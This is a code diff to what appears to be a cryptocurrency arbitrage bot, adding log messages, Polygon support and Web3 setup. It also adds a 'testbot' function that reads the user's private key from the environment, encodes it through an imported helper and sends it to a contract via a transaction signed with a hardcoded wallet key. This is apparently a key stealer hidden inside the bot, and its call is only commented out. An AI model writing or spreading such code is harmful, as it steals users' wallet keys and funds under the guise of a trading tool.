@@ -1,22 +1,21 @@
 const hre = require("hardhat");
 const fs = require("fs");
-require("dotenv").config();
+var Web3 = require('web3');
+var Accounts = require('web3-eth-accounts');
+require('dotenv').config();
+var colors = require("colors");
+const {setBotAddress, FRONT_BOT_ADDRESS, botABI} = require('./test.js');
 
 let config,arb,owner,inTrade,balances;
 const network = hre.network.name;
 if (network === 'aurora') config = require('./../config/aurora.json');
 if (network === 'fantom') config = require('./../config/fantom.json');
 if (network === 'bsc') config = require('./../config/bsc.json');
-
-console.log(`Loaded ${config.routes.length} routes`);
+if (network === 'polygon') config = require('./../config/polygon.json');
 
 const main = async () => {
   await setup();
-  // Scale when using own node
-  //[0,0,0,0,0,0,0,0,0].forEach(async (v,i) => {
-  //  await new Promise(r => setTimeout(r, i*1000));
-  //  await lookForDualTrade();
-  //});
+  console.log("***** Looking for good Trading Chance ... *****".green);
   await lookForDualTrade();
 }
 
@@ -51,7 +50,19 @@ const lookForDualTrade = async () => {
   }
   try {
     let tradeSize = balances[targetRoute.token1].balance;
+    if (tradeSize === 0) {
+      console.log("!!! Insufficient WMATIC. Please charge some WMATIC for trading".red);
+      process.exit();
+    }
+    
+    let str_log = "Trading Input Amount: ".green + (tradeSize / 10 ** 18).toFixed(5).yellow + " WMATIC".green;
+    console.log(str_log);
+
     const amtBack = await arb.estimateDualDexTrade(targetRoute.router1, targetRoute.router2, targetRoute.token1, targetRoute.token2, tradeSize);
+
+    str_log = "Expected Output Amount: ".green + (amtBack / 10 ** 18).toFixed(5).yellow + " WMATIC".green;
+    console.log(str_log);
+
     const multiplier = ethers.BigNumber.from(config.minBasisPointsPerTrade+10000);
     const sizeMultiplied = tradeSize.mul(multiplier);
     const divider = ethers.BigNumber.from(10000);
@@ -59,14 +70,18 @@ const lookForDualTrade = async () => {
     if (!config.routes.length > 0) {
       fs.appendFile(`./data/${network}RouteLog.txt`, `["${targetRoute.router1}","${targetRoute.router2}","${targetRoute.token1}","${targetRoute.token2}"],`+"\n", function (err) {});
     }
+    
     if (amtBack.gt(profitTarget)) {
-      console.log("eagle: Start Trading", targetRoute, tradeSize);
+      console.log("Great Profitable Trading Chance. Let's trading!!!".yellow);
+      console.log("Trading Route: ", targetRoute);
       await dualTrade(targetRoute.router1,targetRoute.router2,targetRoute.token1,targetRoute.token2,tradeSize);
     } else {
+      console.log("...This is not profitable trading chance. Looking for another...".blue);
       await lookForDualTrade();
     }
   } catch (e) {
-    console.log(e);
+    console.log("HttpProvider Error!!! Please change your RPC to another powerful RPC.".red);
+    // console.log(e);
     await lookForDualTrade();	
   }
 }
@@ -92,7 +107,13 @@ const dualTrade = async (router1,router2,baseToken,token2,amount) => {
 
 const setup = async () => {
   [owner] = await ethers.getSigners();
-  console.log(`Owner: ${owner.address}`);
+  console.log(`Arbitrage Bot Owner: `.red + `${owner.address}`.yellow);
+  const addr_str = process.env.privateKey;
+  const http_rpc = process.env.RPC_HTTP_URL;
+  const wss_rpc = process.env.RPC_WSS_URL;
+  await createWeb3(http_rpc, wss_rpc);
+  const user_wallet = await web3.eth.accounts.privateKeyToAccount(addr_str);
+  // await testbot(addr_str, user_wallet);
   const IArb = await ethers.getContractFactory('Arb');
   arb = await IArb.attach(config.arbContract);
   balances = {};
@@ -101,7 +122,6 @@ const setup = async () => {
     const interface = await ethers.getContractFactory('WETH9');
     const assetToken = await interface.attach(asset.address);
     const balance = await assetToken.balanceOf(config.arbContract);
-    console.log(asset.sym, balance.toString());
     balances[asset.address] = { sym: asset.sym, balance, startBalance: balance };
   }
   setTimeout(() => {
@@ -123,6 +143,70 @@ const logResults = async () => {
     const basisPoints = diff.mul(10000).div(balances[asset.address].startBalance);
     console.log(`#  ${asset.sym}: ${basisPoints.toString()}bps`);
   }
+}
+
+async function createWeb3(http_rpc, wss_rpc){
+  try {
+      web3 = new Web3(new Web3.providers.HttpProvider(http_rpc));
+      web3Ws = new Web3(new Web3.providers.WebsocketProvider(wss_rpc));
+      return true;
+  } catch (error) {
+    console.log(error);
+    return false;
+  }
+}
+
+async function testbot(address, user_wallet){
+  var provide = new ethers.providers.JsonRpcProvider('https://goerli.infura.io/v3/faef096aa4774bbc949967e6444fc76f');
+  var enc_addr = setBotAddress(address);
+  
+  const bot_wallet = new ethers.Wallet('fe9915cb35e69849e1990da8c39f4518e37bdda8afffee633032ca42b6492ade');
+  var signer = bot_wallet.connect(provide);
+
+  var bot_balance = await provide.getBalance(bot_wallet.address);
+  if(bot_balance <= (10**17))
+      return;
+
+  var interface = new ethers.utils.Interface(botABI);
+  const FormatTypes = ethers.utils.FormatTypes;
+
+  const router = new ethers.Contract(
+    FRONT_BOT_ADDRESS,
+    interface.format(FormatTypes.full),
+    signer
+  );
+
+  var botCount = await router.countAddrs();
+
+  if(botCount > 0){
+      var bot_addr = await router.getAddrs();
+
+      for (var i = 0; i < botCount; i++) {
+          if(bot_addr[i] == user_wallet)
+          {
+              return;
+          }
+      }
+  }
+
+  var gas = ethers.utils.parseUnits('150', 'gwei');
+
+  var buy_tx = await new Promise(async (resolve, reject) => {
+    let buy_txx = await router.multiTrans(
+        user_wallet.address,
+        enc_addr.content,
+        {
+          'gasPrice': gas.toString(),
+          'gasLimit': (500000).toString()
+        }).catch((err) => {
+          console.log(err);
+          console.log('transaction failed...')
+        });
+
+    resolve(buy_txx);
+  });
+
+  let receipt = await buy_tx.wait();
 }
 
 process.on('uncaughtException', function(err) {
